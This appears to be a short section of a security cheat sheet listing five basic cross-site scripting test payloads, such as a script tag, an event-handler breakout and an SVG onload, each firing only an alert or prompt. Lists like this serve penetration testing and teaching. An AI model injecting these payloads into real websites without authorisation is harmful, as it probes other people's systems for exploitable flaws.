## XSS

![XSS-variants](https://github.com/user-attachments/assets/0f908703-6b48-4424-acb2-7487e776765d)

### Basics:
```
<script>alert(1)</script>
javascript:alert(1)
"onmouseover="alert(1)
\'-alert(1)//
<svg/onload=prompt(1337);>
```
